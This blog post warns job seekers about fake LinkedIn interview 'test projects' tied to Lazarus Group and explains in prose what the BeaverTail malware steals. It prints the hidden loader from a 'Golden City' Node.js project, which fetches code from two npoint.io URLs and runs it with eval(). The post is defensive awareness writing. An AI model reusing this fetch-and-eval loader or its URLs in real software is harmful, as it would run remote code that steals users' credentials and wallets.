Title: The Insidious Danger in LinkedIn Job Interviews: BeaverTail and Lazarus Group
Date: 2026-05-11 19:57
Category: Haberler
Tags: linkedin scam, beavertail, malware, lazarus group, siber guvenlik, arch linux, reverse engineering
Slug: linkedin-is-gorusmesi-dolandiriciligi-beavertail
Authors: yuceltoluyag
Summary: We analyze the North Korean hackers behind the "too sweet" job offers you encounter on LinkedIn and the BeaverTail malware that sneaks into your system under the guise of a test project.
Image: images/linkedin-scam-security-xl.webp
Lang: en
toot: https://mastodon.social/@yuceltoluyag/116592488328711310
bluesky: https://bsky.app/profile/did:plc:lu4xdq66ovwpakyavsmdvqbc/post/3mm3iw6fnb22l
Status: published

The 2026 job market is literally "cooked". On one hand, thousands of candidates; on the other hand, scammers selling empty dreams. But these scammers are not just amateurs chasing your money; they are professional cyber attackers with state backing (North Korea - Lazarus Group) behind them.

The scenario is always the same: You've been looking for a job for months, you only have money left in your pocket to buy pasta and yogurt, and bam! A dream-like job offer of 12 thousand dollars drops into your LinkedIn inbox. The moment they say "Let's have an interview, and just run this test project," you are actually opening the door to a disaster.

## 🕸️ The Trap: "Golden City" and the Insidious eval()

The attackers want you to download a simple "test project" (for example, "Golden City") to make you feel comfortable. The project looks like an innocent Node.js application at first glance. However, look at this piece of code hidden inside `backend/controllers/userController.js`:

```javascript
// Friday13-Security: The purpose of this code is not to help you, but to ruin your life.
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
  const rs_L = await axios.get("https://api.npoint.io/e8e29958efde154f3d7d");
  const rs_C = await axios.get("https://api.npoint.io/632ab82bbc8d7f4c2d44");
  eval(rs_L.data.cookie);
  eval(rs_C.data.cookie);
})();
```

The `eval()` function here runs the malicious, obfuscated code pulled from `npoint.io` (which is constantly updated) in your system with full privileges. While you think "I am installing the project", your browser sessions are stolen and your crypto wallets are emptied.

## 🛠️ Analysis: Breaking Down BeaverTail

This malware (BeaverTail) uses infinite loops (`while(!![])`) and complex string tables to confuse deobfuscators. However, since we Arch users are "paranoid" enough not to install any package without examining it one by one, we do not fall for these traps (or we shouldn't, haha).

When the malicious code is decrypted, it turns out it does the following:
*   Collects system information such as `hostname`, `platform`, `homeDir`.
*   Scans sensitive data (cookies, passwords) of browsers like Brave, Chrome, Opera.
*   Since it runs with `eval()` in a Node.js environment, it has full permissions on the filesystem.

## 🏰 Why Arch Users Don't Fall for It?

Jokes aside, the terminal discipline of an Arch Linux user is the biggest shield against such attacks. In the `yuceltoluyag@archlinux` terminal, looking at `package.json`, dependencies, and scripts before typing `npm install` is in our DNA.

As we have experienced on our own systems, those who downloaded "sketchy" files from DC++ or Limewire in their childhood and caught every kind of cyber "disease" that was transmitted online, have acquired "special abilities" today to recognize this insidious software at a glance. Paranoia is sometimes the biggest firewall.

---

## 🥊 Lessons to Learn

1.  **Think Before Running a Repo:** Never run any unfamiliar repo coming from LinkedIn on your host machine (bare metal). Use Docker or a completely isolated VM.
2.  **npoint.io and eval() is a Red Line:** If you see a structure in a project that pulls code from outside and runs it with `eval()`, run away without looking back.
3.  **The Business World is a Wolf's Table:** Very sweet offers are usually a poisoned apple. Especially if there is a "test project before interview" requirement, be twice as careful.

If these crazy "BeaverTail" hyenas have stooped low enough to target job seekers, we need to sharpen our technical defenses just as much. Carry that "testing discipline" I mentioned in my [Test Your Pelican Static Site with Playwright](/en/pelican-statik-site-playwright-test/) post to the security field as well, kardaş.

Stay paranoid, stay safe!

---

## 🔗 Sources and Acknowledgements

Deobfuscating such insidious operations really requires great patience and technical tracking. During the analysis process, the datasets compiled by Bogdan (himthe.dev) were very enlightening. We owe him a thank you for this transparent attitude.

- [Bogdan's Original Analysis](https://www.himthe.dev/blog/linkedin-interview-scams){: target="\_blank" rel="noopener noreferrer"}
- [Exposed Malicious GitHub Repositories (List)](https://github.com/xndbogdan/malicious-repositories){: target="\_blank" rel="noopener noreferrer"}

---

## 🔗 Related Posts
- [Linux Security: A Full Comprehensive Guide with ClamAV](/en/linux-guvenlik-clamav-tam-kapsamli-rehber/)
- [Arch Linux DDOS and Service Outage Analysis](/en/arch-linux-ddos-hizmet-kesintisi/)
- [Playwright Arch Linux Installation Guide](/en/playwright-arch-linux-kurulum/)
